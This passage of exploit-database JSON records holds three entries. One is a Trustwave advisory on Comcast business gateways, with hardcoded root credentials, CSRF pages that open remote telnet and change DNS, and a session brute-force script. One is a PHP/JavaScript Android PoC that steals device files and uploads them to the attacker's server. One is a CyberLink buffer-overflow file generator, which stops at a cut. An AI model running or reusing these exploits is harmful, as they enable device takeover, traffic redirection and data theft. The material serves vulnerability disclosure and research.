                "code": "Trustwave's SpiderLabs Security Advisory TWSL2011-002:\r\nVulnerabilities in Comcast DOCSIS 3.0 Business Gateways\r\n(D3G-CCR)\r\n\r\nhttps://www.trustwave.com/spiderlabs/advisories/TWSL2011-002.txt\r\n\r\nPublished: 2011-02-04\r\nVersion: 1.0\r\n\r\nVendor: Comcast (http://comcast.com)\r\nProduct: Comcast DOCSIS 3.0 Business Gateway - D3G-CCR\r\nVersion affected:  Versions prior to 1.4.0.49.2\r\n\r\nProduct description:\r\nThe Comcast DOCSIS 3.0 Business Gateway provides end-user termination of\r\ncable internet services for Comcast Business Class customers with enhanced\r\nservices including Network Address Translation (NAT), firewalling, and\r\nVirtual Private Network (VPN) termination.\r\n\r\nCredit: Zack Fasel and Matthew Jakubowski of Trustwave's SpiderLabs\r\n\r\nFinding 1: Static Credentials\r\nCVE: CVE-2011-0885\r\n\r\nAll D3G-CCR gateways provided by Comcast have an administrative\r\nlogin of \"mso\" with the password of \"D0nt4g3tme\".  These passwords\r\nare not provided as a part of the installation of the device and are\r\nnot recommended to be changed, thus the majority of users are unaware\r\nof the default configuration.\r\n\r\nWith these default credentials, internal attackers can modify device\r\nconfigurations to leverage more significant attacks, including redirection\r\nof DNS requests, creation of a remote VPN termination point, and\r\nmodification of NAT entries.  These credentials provide access to the web\r\ninterface for management, as well as a telnet interface that provides shell\r\naccess to the device.  The mso login provides shell as UID 0 (root).\r\n\r\n\r\nFinding 2: Cross Site Request Forgery (CSRF)\r\nCVE: CVE-2011-0886\r\nD3G-CCR gateways provided by Comcast permit CSRF attacks against\r\nnumerous management pages allowing an attacker to embed in a webpage a\r\nmalicious request against the gateway's management interface.  Through\r\nthis, an attacker can modify device configuration and enable remote\r\nadministration via a telnet shell and http.\r\n\r\nThe following Proof of Concept (PoC) connects to the gateway, logs in,\r\nmodifies the remote administration to allow any user to connect externally,\r\nand modifies the DNS information.\r\n\r\n## d3g-csrf-poc.htm\r\n\r\n<html>\r\n<body>\r\n<iframe src=\"./d3g-csrf-poc-1.htm\" width=\"1\" height=\"1\">\r\n</iframe>\r\n<iframe src=\"./d3g-csrf-poc-2.htm\" width=\"1\" height=\"1\">\r\n</iframe>\r\n<iframe src=\"./d3g-csrf-poc-3.htm\" width=\"1\" height=\"1\">\r\n</iframe> </body> </html>\r\n\r\n## d3g-csrf-poc-1.htm\r\n\r\n<html>\r\n<body>\r\n<form action=\"http://10.1.10.1/goform/login\" method=\"post\"\r\n\tname=\"tF\">\r\n<input type=\"hidden\" name=\"user\" value=\"mso\" />\r\n<input type=\"hidden\" name=\"pws\" value=\"D0nt4g3tme\" />\r\n</form> <script> document.tF.submit(); </script> </body>\r\n</html>\r\n\r\n## d3g-csrf-poc-2.htm\r\n\r\n<html>\r\n<body>\r\n<form action=\"http://10.1.10.1/goform/RemoteRange\"\r\nname=\"RMangement\" method=\"post\"> <input type=\"hidden\"\r\nvalue=\"feat-admin-remote\" name=\"file\"> <input type=\"hidden\"\r\nvalue=\"admin/\" name=\"dir\"> <input type=\"hidden\"\r\nname=\"RemoteRange\" value=\"0\" /> <input type=\"hidden\"\r\nname=\"rm_access\" value=\"on\" /> <input type=\"hidden\"\r\nname=\"Remote0\" value=\"0.0.0.0,0.0.0.0,1\" /> <input\r\ntype=\"hidden\" name=\"http_port\" value=\"8080\" /> <input\r\ntype=\"hidden\" name=\"http_enable\" value=\"on\" /> <input\r\ntype=\"hidden\" name=\"http_flag\" value=\"1\" /> <input\r\ntype=\"hidden\" name=\"msoremote_enableCheck\" value=\"on\" />\r\n<input type=\"hidden\" name=\"mso_remote_enable\" value=\"1\" />\r\n<input type=\"hidden\" name=\"remote_enable\" value=\"0\" />\r\n<input type=\"hidden\" name=\"https_enable\" value=\"on\" />\r\n<input type=\"hidden\" name=\"https_port\" value=\"8181\" />\r\n<input type=\"hidden\" name=\"https_flag\" value=\"1\" /> <input\r\ntype=\"hidden\" name=\"telnet_enable\" value=\"on\" /> <input\r\ntype=\"hidden\" name=\"telnet_port\" value=\"2323\" /> <input\r\ntype=\"hidden\" name=\"telnet_flag\" value=\"1\" /> <input\r\ntype=\"hidden\" name=\"Remote1=\" value=\"\" /> </form> </body>\r\n</html> <script>\r\nsetTimeout(\"document.RMangement.submit()\",4000);\r\n</script>\r\n</body>\r\n</html>\r\n\r\n## d3g-csrf-poc-3.htm\r\n\r\n<html>\r\n<body>\r\n<form name=\"WanIPform\"\r\naction=\"http://10.1.10.1/goform/Basic\" method=\"post\"> <input\r\ntype=\"hidden\" value=\"feat-wan-ip\" name=\"file\"> <input\r\ntype=\"hidden\" value=\"admin/\" name=\"dir\"> <input\r\ntype=\"hidden\" value=\"Fixed\" name=\"DNSAssign\"> <input\r\ntype=\"hidden\" value=\"0\" name=\"dhcpc_release\"> <input\r\ntype=\"hidden\" value=\"0\" name=\"dhcpc_renew\"> <input\r\ntype=\"hidden\" value=\"\" name=\"domain_name\"> <input\r\ntype=\"hidden\" value=\"\" name=\"WDn\"> <input type=\"hidden\"\r\nname=\"SysName\" value=\"\" /> <input type=\"hidden\"\r\nname=\"manual_dns_enable\" value=\"on\" /> <input type=\"hidden\"\r\nname=\"DAddr\" value=\"4.2.2.1\" /> <input type=\"hidden\"\r\nname=\"DAddr0\" value=\"4\" /> <input type=\"hidden\"\r\nname=\"DAddr1\" value=\"2\" /> <input type=\"hidden\"\r\nname=\"DAddr2\" value=\"2\" /> <input type=\"hidden\"\r\nname=\"DAddr3\" value=\"1\" /> <input type=\"hidden\"\r\nname=\"PDAddr\" value=\"4.2.2.2\" /> <input type=\"hidden\"\r\nname=\"PDAddr0\" value=\"4\" /> <input type=\"hidden\"\r\nname=\"PDAddr1\" value=\"2\" /> <input type=\"hidden\"\r\nname=\"PDAddr2\" value=\"2\" /> <input type=\"hidden\"\r\nname=\"PDAddr3\" value=\"2\" /> </form> <script>\r\nsetTimeout(\"document.WanIPform.submit()\",5000);\r\n</script>\r\n</body>\r\n</html>\r\n\r\nIf the PoC was embedded in any web page the targeted user visited while\r\nlogged into the device, the attacker would be provided remote\r\nadministration in to the gateway device include a telnet shell.  This would\r\nallow the attacker to redirect traffic to a malicious end-point.\r\n\r\n\r\nFinding 3: Weak Session Management \r\nCVE: CVE-2011-0887\r\nD3G-CCR gateways provided by Comcast utilize a predictable value to\r\nvalidate the active web management portal session.  The epoch time of\r\nbeginning of the session is stored as a cookie labeled \"userid\".  This\r\nprovides a predictable range of session IDs that can be brute-forced.\r\n\r\nThe following PoC attempts to brute force the session IDs by requesting the\r\nadmin page with an incrementing cookie and determining whether it wants to\r\nredirect to login.asp.\r\n\r\n## d3g-session-poc.sh\r\n\r\n#!/bin/bash\r\nstart=1267604160\r\nend=1267605960\r\nfor (( i=$start; i<=$end; i++)) do if [ `curl -sb userid=$i\r\nhttp://10.1.10.1/admin/index.asp | grep -c login.asp` -lt\r\n\"1\" ] then echo \"Session ID Found:  $i\"\r\nfi\r\nif [ $(($i % 100)) -eq \"0\" ]\r\nthen echo \"Currently at $i\"\r\nfi\r\ndone\r\n\r\nThrough this, an attacker can brute-force the possible valid session IDs.\r\nSessions do by default expire within 10 minutes, thus the attack window is\r\nlimited but can be leveraged with other attack methods.\r\n\r\n\r\nVendor Response:\r\nThese issues have been addressed as of version 1.4.0.49.2\r\n\r\nRemediation Steps:\r\nIn order to determine if the correct version is installed, users should\r\nview the \"About\" link in the management interface. Versions 1.4.0.49.2 and\r\nabove have been corrected.\r\n\r\nVendor Communication Timeline:\r\n08/30/10 - Vulnerability disclosed\r\n01/21/11 - Patch Released\r\n02/04/11 - Advisory Published\r\n\r\nRevision History:\r\n1.0 Initial publication\r\n\r\n\r\nAbout Trustwave:\r\nTrustwave is the leading provider of on-demand and subscription-based\r\ninformation security and payment card industry compliance management\r\nsolutions to businesses and government entities throughout the world. For\r\norganizations faced with today's challenging data security and compliance\r\nenvironment, Trustwave provides a unique approach with comprehensive\r\nsolutions that include its flagship TrustKeeper compliance management\r\nsoftware and other proprietary security solutions. Trustwave has helped\r\nthousands of organizations--ranging from Fortune 500 businesses and large\r\nfinancial institutions to small and medium-sized retailers--manage\r\ncompliance and secure their network infrastructure, data communications and\r\ncritical information assets. Trustwave is headquartered in Chicago with\r\noffices throughout North America, South America, Europe, Africa, China and\r\nAustralia. For more information, visit https://www.trustwave.com\r\n\r\nAbout Trustwave's SpiderLabs:\r\nSpiderLabs(R) is the advanced security team at Trustwave focused on\r\napplication security, incident response, penetration testing, physical\r\nsecurity and security research. The team has performed over a thousand\r\nincident investigations, thousands of penetration tests and hundreds of\r\napplication security tests globally. In addition, the SpiderLabs Research\r\nteam provides intelligence through bleeding-edge research and proof of\r\nconcept tool development to enhance Trustwave's products and services.\r\nhttps://www.trustwave.com/spiderlabs\r\n\r\nDisclaimer:\r\nThe information provided in this advisory is provided \"as is\" without\r\nwarranty of any kind. Trustwave disclaims all warranties, either express or\r\nimplied, including the warranties of merchantability and fitness for a\r\nparticular purpose. In no event shall Trustwave or its suppliers be liable\r\nfor any damages whatsoever including direct, indirect, incidental,\r\nconsequential, loss of business profits or special damages, even if\r\nTrustwave or its suppliers have been advised of the possibility of such\r\ndamages. Some states do not allow the exclusion or limitation of liability\r\nfor consequential or incidental damages so the foregoing limitation may not\r\napply.",
                "description": "Comcast DOCSIS 3.0 Business Gateways - Multiple Vulnerabilities",
                "author": "Trustwave's SpiderLabs",
                "_id": 16123,
                "source": "ExploitDB",
                "platform": "hardware",
                "date": "2011-02-06T00:00:00+00:00",
                "cve": [
                    "CVE-2011-0885",
                    "CVE-2011-0886",
                    "CVE-2011-0887"
                ],
                "type": "remote",
                "port": 0
            },
            {
                "code": "<?php \r\n/* \r\n* Description:  Android 'content://' URI Multiple Information Disclosure Vulnerabilities\r\n* Bugtraq ID:   48256\r\n* CVE:          CVE-2010-4804\r\n* Affected:     Android < 2.3.4\r\n* Author:       Thomas Cannon\r\n* Discovered:   18-Nov-2010\r\n* Advisory:     http://thomascannon.net/blog/2010/11/android-data-stealing-vulnerability/\r\n*\r\n* Filename:     poc.php\r\n* Instructions: Specify files you want to upload in filenames array. Host this php file\r\n*               on a server and visit it using the Android Browser. Some builds of Android\r\n*               may require adjustments to the script, for example when a German build was\r\n*               tested it downloaded the payload as .htm instead of .html, even though .html\r\n*               was specified. \r\n*\r\n* Tested on:    HTC Desire (UK Version) with Android 2.2\r\n*/\r\n\r\n//  List of the files on the device that we want to upload to our server\r\n$filenames = array(\"/proc/version\",\"/sdcard/img.jpg\");\r\n\r\n//  Determine the full URL of this script\r\n$protocol = $_SERVER[\"HTTPS\"] == \"on\" ? \"https\" : \"http\";\r\n$scripturl = $protocol.\"://\".$_SERVER[\"HTTP_HOST\"].$_SERVER[\"SCRIPT_NAME\"];\r\n\r\n//  Stage 0:  Display introduction text and a link to start the PoC.\r\nfunction stage0($scripturl) {\r\n  echo \"<b>Android < 2.3.4</b><br>Data Stealing Web Page<br><br>Click: <a href=\\\"$scripturl?stage=1\\\">Malicious Link</a>\";\r\n}\r\n\r\n//  Stage 1:  Redirect to Stage 2 which will force a download of the HTML/JS payload, then a few seconds later redirect \r\n//            to the payload. We load the payload using a Content Provider so that the JavaScript is executed in the\r\n//            context of the local device - this is the vulnerability.\r\nfunction stage1($scripturl) {\r\n  echo \"<body onload=\\\"setTimeout('window.location=\\'$scripturl?stage=2\\'',1000);setTimeout('window.location=\\'content://com.android.htmlfileprovider/sdcard/download/poc.html\\'',5000);\\\">\";\r\n}\r\n\r\n//  Stage 2:  Download of payload, the Android browser doesn't prompt for the download which is another vulnerability.\r\n//            The payload uses AJAX calls to read file contents and encodes as Base64, then uploads to server (Stage 3).\r\nfunction stage2($scripturl,$filenames) {\r\n  header(\"Cache-Control: public\");\r\n  header(\"Content-Description: File Transfer\");\r\n  header(\"Content-Disposition: attachment; filename=poc.html\");\r\n  header(\"Content-Type: text/html\");\r\n  header(\"Content-Transfer-Encoding: binary\");\r\n?>\r\n<html>\r\n  <body>\r\n    <script language='javascript'>\r\n      var filenames = Array('<?php echo implode(\"','\",$filenames); ?>');\r\n      var filecontents = new Array();\r\n      function processBinary(xmlhttp) {\r\n        data = xmlhttp.responseText;    r = '';   size = data.length;\r\n        for(var i = 0; i < size; i++)   r += String.fromCharCode(data.charCodeAt(i) & 0xff);\r\n        return r;\r\n      }\r\n      function getFiles(filenames) {\r\n        for (var filename in filenames) {\r\n          filename = filenames[filename];\r\n          xhr = new XMLHttpRequest();\r\n          xhr.open('GET', filename, false);\r\n          xhr.overrideMimeType('text/plain; charset=x-user-defined');\r\n          xhr.onreadystatechange = function() { if (xhr.readyState == 4) { filecontents[filename] = btoa(processBinary(xhr)); } }\r\n          xhr.send();\r\n        }\r\n      }\r\n      function addField(form, name, value) {\r\n        var fe = document.createElement('input');\r\n        fe.setAttribute('type', 'hidden');\r\n        fe.setAttribute('name', name);\r\n        fe.setAttribute('value', value);\r\n        form.appendChild(fe);\r\n      }\r\n      function uploadFiles(filecontents) {\r\n        var form = document.createElement('form');\r\n        form.setAttribute('method', 'POST');\r\n        form.setAttribute('enctype', 'multipart/form-data');\r\n        form.setAttribute('action', '<?=$scripturl?>?stage=3');\r\n        var i = 0;\r\n        for (var filename in filecontents) {\r\n          addField(form, 'filename'+i, btoa(filename));\r\n          addField(form, 'data'+i, filecontents[filename]);\r\n          i += 1;\r\n        }\r\n        document.body.appendChild(form);\r\n        form.submit();\r\n      }\r\n      getFiles(filenames);\r\n      uploadFiles(filecontents);\r\n    </script>\r\n  </body>\r\n</html>\r\n<?php\r\n}\r\n\r\n//  Stage 3:  Read the file names and contents sent by the payload and write to a file on the server.\r\nfunction stage3() {\r\n  $fp = fopen(\"files.txt\", \"w\") or die(\"Couldn't open file for writing!\");\r\n  fwrite($fp, print_r($_POST, TRUE)) or die(\"Couldn't write data to file!\"); \r\n  fclose($fp); \r\n  echo \"Data uploaded to <a href=\\\"files.txt\\\">files.txt</a>!\";\r\n}\r\n\r\n//  Select the stage to run depending on the parameter passed in the URL\r\nswitch($_GET[\"stage\"]) { \r\n  case \"1\": \r\n    stage1($scripturl); \r\n    break; \r\n  case \"2\": \r\n    stage2($scripturl,$filenames); \r\n    break; \r\n  case \"3\": \r\n    stage3(); \r\n    break;\r\n  default: \r\n    stage0($scripturl); \r\n    break; \r\n} \r\n?>",
                "description": "Google Android - 'content://' URI Multiple Information Disclosure Vulnerabilities",
                "author": "Thomas Cannon",
                "_id": 18164,
                "source": "ExploitDB",
                "platform": "android",
                "date": "2011-11-28T00:00:00+00:00",
                "cve": [
                    "CVE-2010-4804"
                ],
                "type": "webapps",
                "port": 0
            },
            {
                "code": "#!/usr/bin/python\r\n# \r\n# Exploit Title: CyberLink Multiple Products File Project Handling Stack Buffer Overflow POC\r\n# by: modpr0be[at]spentera[dot]com (@modpr0be)\r\n# Platform: Windows\r\n# Tested on: Windows XP SP3, Windows 7 SP1 with:\r\n# \tCyberLink Power2Go 7 (build 196)\r\n# \tCyberLink Power2Go 8 (build 1031)\r\n# \tCyberLink WaveEditor 2.0 (build 2204)\r\n# Software Link: http://www.cyberlink.com/downloads/trials/index_en_US.html\r\n# CVE : -\r\n\r\n### Software Description\r\n# CyberLink Power2Go is all-media disc burning software. \r\n# Copy all your media to any disc with Power2Go 8! With new System Recovery tools \r\n# and over 5000 free DVD menus to choose from on DirectorZone.com, Power2Go 8 not \r\n# only burns everything but allows you to create pro-like DVDs, rip CDs and \r\n# safeguard valuable data. \r\n\r\n# CyberLink Wave Editor will help user to convert audio format when producing, editing, \r\n# or creating backups for some audios or videos. This additional tools is also included \r\n# since PowerDirector 9 to PowerDirector 10, and now included on Power2Go 8.\r\n\r\n### Vulnerability Details\r\n# Most of CyberLink products contain built-in project file with their own format and\r\n# extension. This file usually contains our recently modified project or work.\r\n# Most of this filetypes contain this section:\r\n#     <File src=\r\n#     <File name=\r\n# Generally, those sections will be filled with source path or filename. \r\n# both products will lead us to command execution because the address of \r\n# SE Handler is overwritten with 0x00410041.\r\n\r\n# Notes:\r\n# I cannot find any good return address for WaveEditor, if you can make it\r\n# through the hard way, kudos!!\r\n\r\n### Vendor logs:\r\n# 10/10/2011 - Bug found\r\n# 10/11/2011 - Vendor contacted\r\n# 10/11/2011 - Vendor replied and requested POC\r\n# 10/11/2011 - POC sent to vendor\r\n# 10/31/2011 - Vendor said the POC will be researched\r\n# 10/27/2011 - Submitted to CERT\r\n# 11/09/2011 - CyberLink updated the product\r\n# 11/09/2011 - POC still works on the latest version\r\n# 12/09/2011 - No response from vendor, POC release.\r\n\r\nimport time,sys\r\n\r\ndef power2go():\r\n\t# header for power2go\r\n\theader = (\r\n\t\"\\x3c\\x50\\x72\\x6f\\x6a\\x65\\x63\\x74\\x20\\x6d\\x61\\x67\\x69\\x63\"\r\n\t\"\\x3d\\x22\\x69\\x6e\\x73\\x65\\x63\\x75\\x72\\x69\\x74\\x79\\x22\\x20\"\r\n\t\"\\x76\\x65\\x72\\x73\\x69\\x6f\\x6e\\x3d\\x22\\x31\\x30\\x31\\x22\\x3e\"\r\n\t\"\\x0d\\x0a\\x3c\\x49\\x6e\\x66\\x6f\\x72\\x6d\\x61\\x74\\x69\\x6f\\x6e\"\r\n\t\"\\x2f\\x3e\\x0d\\x0a\\x3c\\x43\\x6f\\x6d\\x70\\x69\\x6c\\x61\\x74\\x69\"\r\n\t\"\\x6f\\x6e\\x3e\\x0d\\x0a\\x3c\\x44\\x61\\x74\\x61\\x44\\x69\\x73\\x63\"\r\n\t\"\\x20\\x0d\\x0a\\x64\\x69\\x73\\x63\\x4e\\x61\\x6d\\x65\\x3d\\x22\\x49\"\r\n\t\"\\x4e\\x53\\x45\\x43\\x55\\x52\\x49\\x54\\x59\\x22\\x20\\x0d\\x0a\\x66\"\r\n\t\"\\x69\\x6c\\x65\\x44\\x61\\x74\\x65\\x3d\\x22\\x6f\\x72\\x69\\x67\\x69\"\r\n\t\"\\x6e\\x61\\x6c\\x22\\x20\\x66\\x69\\x6c\\x65\\x54\\x69\\x6d\\x65\\x3d\"\r\n\t\"\\x22\\x30\\x22\\x20\\x0d\\x0a\\x64\\x69\\x73\\x63\\x54\\x79\\x70\\x65\"\r\n\t\"\\x3d\\x22\\x63\\x64\\x22\\x20\\x0d\\x0a\\x73\\x65\\x73\\x73\\x69\\x6f\"\r\n\t\"\\x6e\\x53\\x69\\x7a\\x65\\x3d\\x22\\x30\\x22\\x20\\x0d\\x0a\\x50\\x4f\"\r\n\t\"\\x57\\x42\\x75\\x72\\x6e\\x65\\x64\\x53\\x69\\x7a\\x65\\x3d\\x22\\x30\"\r\n\t\"\\x22\\x20\\x0d\\x0a\\x53\\x65\\x63\\x75\\x72\\x65\\x64\\x44\\x61\\x74\"\r\n\t\"\\x61\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x57\\x68\"\r\n\t\"\\x6f\\x6c\\x65\\x53\\x65\\x63\\x75\\x72\\x65\\x64\\x44\\x61\\x74\\x61\"\r\n\t\"\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x53\\x65\\x63\"\r\n\t\"\\x75\\x72\\x69\\x74\\x79\\x4b\\x65\\x79\\x53\\x69\\x7a\\x65\\x3d\\x22\"\r\n\t\"\\x31\\x36\\x22\\x20\\x0d\\x0a\\x48\\x69\\x64\\x65\\x46\\x69\\x6c\\x65\"\r\n\t\"\\x4e\\x61\\x6d\\x65\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\"\r\n\t\"\\x0a\\x62\\x6f\\x6f\\x74\\x61\\x62\\x6c\\x65\\x3d\\x22\\x66\\x61\\x6c\"\r\n\t\"\\x73\\x65\\x22\\x20\\x0d\\x0a\\x62\\x6f\\x6f\\x74\\x46\\x6c\\x6f\\x70\"\r\n\t\"\\x70\\x79\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x62\"\r\n\t\"\\x6f\\x6f\\x74\\x49\\x6d\\x61\\x67\\x65\\x3d\\x22\\x22\\x20\\x0d\\x0a\"\r\n\t\"\\x61\\x75\\x74\\x6f\\x52\\x75\\x6e\\x45\\x78\\x65\\x3d\\x22\\x66\\x61\"\r\n\t\"\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x61\\x75\\x74\\x6f\\x52\\x75\\x6e\"\r\n\t\"\\x45\\x78\\x65\\x50\\x61\\x74\\x68\\x3d\\x22\\x22\\x20\\x0d\\x0a\\x61\"\r\n\t\"\\x75\\x74\\x6f\\x52\\x75\\x6e\\x49\\x63\\x6f\\x6e\\x3d\\x22\\x66\\x61\"\r\n\t\"\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x61\\x75\\x74\\x6f\\x52\\x75\\x6e\"\r\n\t\"\\x49\\x63\\x6f\\x6e\\x50\\x61\\x74\\x68\\x3d\\x22\\x22\\x20\\x0d\\x0a\"\r\n\t\"\\x41\\x75\\x74\\x6f\\x53\\x70\\x6c\\x69\\x74\\x44\\x69\\x73\\x63\\x3d\"\r\n\t\"\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x44\\x69\\x73\\x63\"\r\n\t\"\\x53\\x70\\x6c\\x69\\x74\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\"\r\n\t\"\\x0d\\x0a\\x41\\x75\\x74\\x6f\\x4f\\x76\\x65\\x72\\x42\\x75\\x72\\x6e\"\r\n\t\"\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x44\\x61\\x74\"\r\n\t\"\\x61\\x50\\x72\\x6a\\x74\\x6f\\x56\\x69\\x64\\x65\\x6f\\x50\\x72\\x6a\"\r\n\t\"\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x73\\x69\\x6d\"\r\n\t\"\\x75\\x6c\\x61\\x74\\x69\\x6f\\x6e\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\"\r\n\t\"\\x22\\x20\\x0d\\x0a\\x62\\x75\\x72\\x6e\\x50\\x72\\x6f\\x6f\\x66\\x3d\"\r\n\t\"\\x22\\x74\\x72\\x75\\x65\\x22\\x20\\x0d\\x0a\\x63\\x6c\\x6f\\x73\\x65\"\r\n\t\"\\x44\\x69\\x73\\x63\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\"\r\n\t\"\\x0a\\x76\\x65\\x72\\x69\\x66\\x79\\x44\\x69\\x73\\x63\\x3d\\x22\\x66\"\r\n\t\"\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x64\\x65\\x66\\x65\\x63\\x74\"\r\n\t\"\\x6d\\x61\\x6e\\x61\\x67\\x65\\x6d\\x65\\x6e\\x74\\x3d\\x22\\x66\\x61\"\r\n\t\"\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x63\\x6f\\x70\\x69\\x65\\x73\\x3d\"\r\n\t\"\\x22\\x31\\x22\\x20\\x0d\\x0a\\x62\\x75\\x72\\x6e\\x53\\x70\\x65\\x65\"\r\n\t\"\\x64\\x3d\\x22\\x30\\x22\\x20\\x0d\\x0a\\x63\\x64\\x54\\x65\\x78\\x74\"\r\n\t\"\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x41\\x75\\x64\"\r\n\t\"\\x69\\x6f\\x4e\\x6f\\x72\\x6d\\x61\\x6c\\x69\\x7a\\x65\\x3d\\x22\\x66\"\r\n\t\"\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x41\\x75\\x64\\x69\\x6f\\x47\"\r\n\t\"\\x61\\x70\\x54\\x69\\x6d\\x65\\x3d\\x22\\x32\\x22\\x20\\x0d\\x0a\\x46\"\r\n\t\"\\x69\\x6c\\x65\\x53\\x79\\x73\\x74\\x65\\x6d\\x3d\\x22\\x49\\x53\\x4f\"\r\n\t\"\\x39\\x36\\x36\\x30\\x5f\\x4a\\x4f\\x4c\\x49\\x45\\x54\\x22\\x3e\")\r\n\r\n\tbody = (\r\n\t\"\\x73\\x72\\x63\\x3d\\x22\\x43\\x3a\\x5c\\x61\\x62\\x63\\x2e\\x74\\x78\"\r\n\t\"\\x74\\x22\\x20\\x0d\\x0a\\x6f\\x70\\x65\\x72\\x61\\x74\\x69\\x6f\\x6e\"\r\n\t\"\\x3d\\x22\\x61\\x64\\x64\\x22\\x20\\x0d\\x0a\\x62\\x75\\x72\\x6e\\x73\"\r\n\t\"\\x74\\x61\\x74\\x75\\x73\\x3d\\x22\\x6e\\x6f\\x74\\x62\\x75\\x72\\x6e\"\r\n\t\"\\x22\\x20\\x0d\\x0a\\x73\\x69\\x7a\\x65\\x3d\\x22\\x32\\x39\\x32\\x38\"\r\n\t\"\\x36\\x34\\x22\\x20\\x0d\\x0a\\x53\\x68\\x6f\\x77\\x53\\x69\\x7a\\x65\"\r\n\t\"\\x3d\\x22\\x32\\x39\\x32\\x38\\x36\\x34\\x22\\x20\\x0d\\x0a\\x41\\x6c\"\r\n\t\"\\x6c\\x6f\\x77\\x45\\x6e\\x63\\x72\\x79\\x70\\x74\\x3d\\x22\\x66\\x61\"\r\n\t\"\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x53\\x65\\x63\\x75\\x72\\x65\\x64\"\r\n\t\"\\x52\\x6f\\x6f\\x74\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\"\r\n\t\"\\x0a\\x66\\x69\\x6c\\x65\\x54\\x69\\x6d\\x65\\x3d\\x22\\x31\\x32\\x39\"\r\n\t\"\\x33\\x36\\x37\\x33\\x34\\x31\\x35\\x30\\x39\\x37\\x33\\x36\\x38\\x37\"\r\n\t\"\\x34\\x22\\x20\\x0d\\x0a\\x6f\\x6c\\x64\\x3d\\x22\\x66\\x61\\x6c\\x73\"\r\n\t\"\\x65\\x22\\x20\\x0d\\x0a\\x74\\x65\\x6d\\x70\\x66\\x69\\x6c\\x65\\x3d\"\r\n\t\"\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x74\\x65\\x6d\\x70\"\r\n\t\"\\x64\\x69\\x72\\x6c\\x65\\x76\\x65\\x6c\\x3d\\x22\\x30\\x22\\x20\\x0d\"\r\n\t\"\\x0a\\x66\\x6f\\x72\\x61\\x75\\x64\\x69\\x6f\\x74\\x72\\x61\\x63\\x6b\"\r\n\t\"\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x74\\x61\\x72\"\r\n\t\"\\x67\\x65\\x74\\x41\\x75\\x64\\x69\\x6f\\x43\\x44\\x3d\\x22\\x66\\x61\"\r\n\t\"\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x64\\x61\\x74\\x61\\x69\\x74\\x65\"\r\n\t\"\\x6d\\x74\\x79\\x70\\x65\\x3d\\x22\\x30\\x22\\x20\\x0d\\x0a\\x6d\\x76\"\r\n\t\"\\x70\\x3d\\x22\\x30\\x22\\x20\\x0d\\x0a\\x61\\x75\\x64\\x69\\x6f\\x53\"\r\n\t\"\\x75\\x62\\x74\\x79\\x70\\x65\\x3d\\x22\\x30\\x22\\x2f\\x3e\\x0d\\x0a\"\r\n\t\"\\x3c\\x2f\\x44\\x61\\x74\\x61\\x44\\x69\\x73\\x63\\x3e\\x0d\\x0a\\x3c\"\r\n\t\"\\x2f\\x43\\x6f\\x6d\\x70\\x69\\x6c\\x61\\x74\\x69\\x6f\\x6e\\x3e\\x0d\"\r\n\t\"\\x0a\\x3c\\x2f\\x50\\x72\\x6f\\x6a\\x65\\x63\\x74\\x3e\")\r\n\r\n\tpgfile = \"overflow.p2g\"\r\n\tf = open(pgfile,'w')\r\n\tjunk = \"A\" * 778\r\n\tnseh = \"\\x42\\x42\"\r\n\tseh = \"\\x43\\x43\"\r\n\tsisa =  \"\\x44\" * 4200\r\n\r\n\thell = \"\\x3c\\x46\\x69\\x6c\\x65\" + \"\\r\\n\"\t# <File\r\n\thell+= \"name=\" + '\"'+ junk+nseh+seh+sisa + '\"'\r\n\ttry:\r\n\t\tf.write(header+ \"\\r\\n\" + hell + \"\\r\\n\" + body)\r\n\t\tprint \"[!] Generating\", pgfile, \"..\"\r\n\t\ttime.sleep(1)\r\n\t\tprint \"[+] File\", pgfile, \"successfully created!\"\r\n\t\tprint \"[*] Now open project file\" +\" \\'\"+pgfile+\"\\' \" + \"with CyberLink Power2Go.\"\r\n\t\tprint \"[*] Good luck ;)\"\r\n\t\tf.close()\r\n\texcept IOError:\r\n\t\tprint \"[-] Could not write to destination folder, check permission..\"\r\n\t\tsys.exit()\r\n\r\ndef waveeditor():\r\n\theader = (\"\\x3c\\x50\\x72\\x6f\\x6a\\x65\\x63\\x74\\x20\\x41\\x70\\x70\\x6c\\x69\\x63\\x61\"\r\n\t\"\\x74\\x69\\x6f\\x6e\\x3d\\x22\\x57\\x61\\x76\\x65\\x45\\x64\\x69\\x74\\x6f\\x72\\x22\\x20\"\r\n\t\"\\x56\\x65\\x72\\x73\\x69\\x6f\\x6e\\x3d\\x22\\x32\\x2e\\x30\\x22\\x3e\")\r\n\r\n\twvefile = \"overflow.wve\"\r\n\tf = open(wvefile,'w')\r\n\tjunk = \"A\" * 3000\r\n\r\n\thell = \"\\x3c\\x46\\x69\\x6c\\x65\\x20\\x53\\x72\\x63\\x3d\" # <File src=\r\n\thell += '\"'+ junk + '\"' + \"\\x3e\"\r\n\r\n\tfill = 